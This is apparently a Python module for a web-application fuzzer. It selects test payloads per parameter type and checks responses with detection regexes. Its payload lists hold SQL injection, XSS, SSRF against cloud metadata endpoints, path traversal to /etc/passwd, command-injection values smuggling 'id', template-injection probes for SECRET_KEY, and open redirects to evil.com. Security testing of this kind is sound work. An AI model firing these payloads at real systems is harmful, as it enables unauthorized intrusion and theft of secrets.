"""
Smart Fuzzer - Intelligent fuzzing with context-aware payloads.

Features:
- Context-aware payload generation
- Parameter type detection
- Adaptive fuzzing based on responses
- Built-in payload database
"""

import logging
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional


logger = logging.getLogger(__name__)


class ParamType(Enum):
    """Detected parameter types."""
    NUMERIC = "numeric"
    STRING = "string"
    EMAIL = "email"
    URL = "url"
    JSON = "json"
    BOOLEAN = "boolean"
    DATE = "date"
    FILE = "file"
    UNKNOWN = "unknown"


class VulnCategory(Enum):
    """Vulnerability categories for fuzzing."""
    SQLI = "sql_injection"
    XSS = "xss"
    SSRF = "ssrf"
    SSTI = "ssti"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    IDOR = "idor"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"


@dataclass
class FuzzPayload:
    """A fuzzing payload with metadata."""
    payload: str
    category: VulnCategory
    description: str
    detection_pattern: Optional[str] = None
    risk_level: int = 5  # 1-10


@dataclass
class FuzzResult:
    """Result of a fuzzing attempt."""
    payload: FuzzPayload
    success: bool
    response_code: int = 0
    response_body: str = ""
    detection_matched: bool = False
    notes: str = ""


class SmartFuzzer:
    """
    Intelligent fuzzing engine with context-aware payloads.
    
    Features:
    - Detects parameter type automatically
    - Selects appropriate payloads
    - Tracks successful patterns
    - Adapts based on responses
    """
    
    _instance: Optional["SmartFuzzer"] = None
    
    def __new__(cls) -> "SmartFuzzer":
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        
        self._payloads: dict[VulnCategory, list[FuzzPayload]] = {}
        self._successful_patterns: list[str] = []
        self._load_payloads()
        self._initialized = True
        logger.info("SmartFuzzer initialized")
    
    def _load_payloads(self):
        """Load built-in payload database."""
        
        # SQL Injection payloads
        self._payloads[VulnCategory.SQLI] = [
            FuzzPayload("'", VulnCategory.SQLI, "Single quote test", r"(sql|syntax|error|mysql|postgres|oracle)", 3),
            FuzzPayload("' OR '1'='1", VulnCategory.SQLI, "Classic OR bypass", None, 5),
            FuzzPayload("' OR 1=1--", VulnCategory.SQLI, "Comment bypass", None, 5),
            FuzzPayload("' UNION SELECT NULL--", VulnCategory.SQLI, "UNION test", None, 6),
            FuzzPayload("1' AND SLEEP(5)--", VulnCategory.SQLI, "Time-based blind", None, 7),
            FuzzPayload("1; WAITFOR DELAY '0:0:5'--", VulnCategory.SQLI, "MSSQL time-based", None, 7),
            FuzzPayload("' AND '1'='1", VulnCategory.SQLI, "Boolean-based", None, 5),
            FuzzPayload("admin'--", VulnCategory.SQLI, "Comment injection", None, 4),
            FuzzPayload("1' ORDER BY 10--", VulnCategory.SQLI, "Column enumeration", None, 5),
        ]
        
        # XSS payloads
        self._payloads[VulnCategory.XSS] = [
            FuzzPayload("<script>alert(1)</script>", VulnCategory.XSS, "Basic script", r"<script>alert\(1\)</script>", 5),
            FuzzPayload("<img src=x onerror=alert(1)>", VulnCategory.XSS, "IMG onerror", r"<img[^>]+onerror", 5),
            FuzzPayload("<svg onload=alert(1)>", VulnCategory.XSS, "SVG onload", r"<svg[^>]+onload", 5),
            FuzzPayload("javascript:alert(1)", VulnCategory.XSS, "Javascript protocol", r"javascript:", 4),
            FuzzPayload("'-alert(1)-'", VulnCategory.XSS, "DOM XSS", None, 6),
            FuzzPayload("<body onload=alert(1)>", VulnCategory.XSS, "Body onload", r"<body[^>]+onload", 5),
            FuzzPayload("{{7*7}}", VulnCategory.XSS, "Template injection test", r"49", 4),
            FuzzPayload("<iframe src=javascript:alert(1)>", VulnCategory.XSS, "Iframe injection", None, 5),
        ]
        
        # SSRF payloads
        self._payloads[VulnCategory.SSRF] = [
            FuzzPayload("http://127.0.0.1", VulnCategory.SSRF, "Localhost", None, 5),
            FuzzPayload("http://localhost", VulnCategory.SSRF, "Localhost name", None, 5),
            FuzzPayload("http://[::1]", VulnCategory.SSRF, "IPv6 localhost", None, 6),
            FuzzPayload("http://169.254.169.254", VulnCategory.SSRF, "AWS metadata", r"ami-id|instance-id", 8),
            FuzzPayload("http://metadata.google.internal", VulnCategory.SSRF, "GCP metadata", None, 8),
            FuzzPayload("file:///etc/passwd", VulnCategory.SSRF, "File protocol", r"root:.*:0:0", 9),
            FuzzPayload("http://0.0.0.0:80", VulnCategory.SSRF, "All interfaces", None, 5),
            FuzzPayload("http://127.0.0.1:22", VulnCategory.SSRF, "Port scan", r"SSH", 6),
        ]
        
        # Path Traversal payloads
        self._payloads[VulnCategory.PATH_TRAVERSAL] = [
            FuzzPayload("../../../etc/passwd", VulnCategory.PATH_TRAVERSAL, "Basic traversal", r"root:", 7),
            FuzzPayload("....//....//....//etc/passwd", VulnCategory.PATH_TRAVERSAL, "Double encoding", r"root:", 7),
            FuzzPayload("..%2f..%2f..%2fetc/passwd", VulnCategory.PATH_TRAVERSAL, "URL encoded", r"root:", 7),
            FuzzPayload("/etc/passwd%00.jpg", VulnCategory.PATH_TRAVERSAL, "Null byte", r"root:", 8),
            FuzzPayload("..\\..\\..\\windows\\win.ini", VulnCategory.PATH_TRAVERSAL, "Windows traversal", r"\[fonts\]", 7),
        ]
        
        # Command Injection payloads
        self._payloads[VulnCategory.COMMAND_INJECTION] = [
            FuzzPayload("; id", VulnCategory.COMMAND_INJECTION, "Semicolon", r"uid=", 8),
            FuzzPayload("| id", VulnCategory.COMMAND_INJECTION, "Pipe", r"uid=", 8),
            FuzzPayload("& id", VulnCategory.COMMAND_INJECTION, "Ampersand", r"uid=", 8),
            FuzzPayload("$(id)", VulnCategory.COMMAND_INJECTION, "Command substitution", r"uid=", 8),
            FuzzPayload("`id`", VulnCategory.COMMAND_INJECTION, "Backticks", r"uid=", 8),
            FuzzPayload("|| ping -c 3 127.0.0.1", VulnCategory.COMMAND_INJECTION, "Ping test", None, 7),
        ]
        
        # SSTI payloads
        self._payloads[VulnCategory.SSTI] = [
            FuzzPayload("{{7*7}}", VulnCategory.SSTI, "Jinja2/Twig test", r"49", 6),
            FuzzPayload("${7*7}", VulnCategory.SSTI, "Freemarker test", r"49", 6),
            FuzzPayload("<%= 7*7 %>", VulnCategory.SSTI, "ERB test", r"49", 6),
            FuzzPayload("{{config}}", VulnCategory.SSTI, "Config leak", r"SECRET_KEY", 8),
            FuzzPayload("{{self.__class__.__mro__}}", VulnCategory.SSTI, "Python MRO", r"class", 7),
        ]
        
        # Open Redirect payloads
        self._payloads[VulnCategory.OPEN_REDIRECT] = [
            FuzzPayload("//evil.com", VulnCategory.OPEN_REDIRECT, "Protocol-relative", None, 5),
            FuzzPayload("https://evil.com", VulnCategory.OPEN_REDIRECT, "Direct redirect", None, 5),
            FuzzPayload("/\\evil.com", VulnCategory.OPEN_REDIRECT, "Backslash bypass", None, 6),
            FuzzPayload("//evil.com/%2f..", VulnCategory.OPEN_REDIRECT, "Path confusion", None, 6),
        ]
    
    def detect_param_type(self, param_name: str, param_value: str) -> ParamType:
        """Detect the type of a parameter based on name and value."""
        name_lower = param_name.lower()
        
        # Check by name patterns
        if any(x in name_lower for x in ['email', 'mail']):
            return ParamType.EMAIL
        if any(x in name_lower for x in ['url', 'link', 'redirect', 'next', 'return', 'goto']):
            return ParamType.URL
        if any(x in name_lower for x in ['file', 'path', 'document', 'upload']):
            return ParamType.FILE
        if any(x in name_lower for x in ['date', 'time', 'created', 'updated']):
            return ParamType.DATE
        if any(x in name_lower for x in ['id', 'num', 'count', 'page', 'size', 'limit']):
            return ParamType.NUMERIC
        
        # Check by value patterns
        if param_value.isdigit():
            return ParamType.NUMERIC
        if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', param_value):
            return ParamType.EMAIL
        if param_value.lower() in ['true', 'false', '1', '0', 'yes', 'no']:
            return ParamType.BOOLEAN
        if param_value.startswith(('http://', 'https://', '//')):
            return ParamType.URL
        if param_value.startswith(('{', '[')):
            return ParamType.JSON
        
        return ParamType.STRING
    
    def get_payloads_for_param(
        self,
        param_name: str,
        param_value: str,
        categories: Optional[list[VulnCategory]] = None
    ) -> list[FuzzPayload]:
        """Get appropriate payloads for a parameter."""
        param_type = self.detect_param_type(param_name, param_value)
        payloads = []
        
        # If specific categories requested, use those
        if categories:
            for cat in categories:
                if cat in self._payloads:
                    payloads.extend(self._payloads[cat])
            return payloads
        
        # Otherwise, select based on parameter type
        if param_type == ParamType.URL:
            payloads.extend(self._payloads.get(VulnCategory.SSRF, []))
            payloads.extend(self._payloads.get(VulnCategory.OPEN_REDIRECT, []))
        
        if param_type == ParamType.NUMERIC:
            payloads.extend(self._payloads.get(VulnCategory.SQLI, []))
            payloads.extend(self._payloads.get(VulnCategory.IDOR, []))
        
        if param_type == ParamType.FILE:
            payloads.extend(self._payloads.get(VulnCategory.PATH_TRAVERSAL, []))
        
        if param_type == ParamType.STRING:
            payloads.extend(self._payloads.get(VulnCategory.SQLI, []))
            payloads.extend(self._payloads.get(VulnCategory.XSS, []))
            payloads.extend(self._payloads.get(VulnCategory.SSTI, []))
            payloads.extend(self._payloads.get(VulnCategory.COMMAND_INJECTION, []))
        
        return payloads
    
    def get_all_payloads(self, category: VulnCategory) -> list[FuzzPayload]:
        """Get all payloads for a specific category."""
        return self._payloads.get(category, [])
    
    def check_detection(self, payload: FuzzPayload, response_body: str) -> bool:
        """Check if detection pattern matches in response."""
        if not payload.detection_pattern:
            return False
        
        return bool(re.search(payload.detection_pattern, response_body, re.IGNORECASE))
    
    def record_success(self, pattern: str):
        """Record a successful payload pattern for learning."""
        if pattern not in self._successful_patterns:
            self._successful_patterns.append(pattern)
            logger.info(f"Recorded successful pattern: {pattern}")
    
    def get_stats(self) -> dict[str, Any]:
        """Get fuzzer statistics."""
        total_payloads = sum(len(p) for p in self._payloads.values())
        return {
            "total_payloads": total_payloads,
            "categories": list(self._payloads.keys()),
            "successful_patterns": len(self._successful_patterns),
        }


# Global instance
_fuzzer: Optional[SmartFuzzer] = None


def get_smart_fuzzer() -> SmartFuzzer:
    """Get or create the global fuzzer instance."""
    global _fuzzer
    if _fuzzer is None:
        _fuzzer = SmartFuzzer()
    return _fuzzer


def fuzz_parameter(
    param_name: str,
    param_value: str,
    categories: Optional[list[VulnCategory]] = None
) -> list[FuzzPayload]:
    """Convenience function to get payloads for a parameter."""
    fuzzer = get_smart_fuzzer()
    return fuzzer.get_payloads_for_param(param_name, param_value, categories)
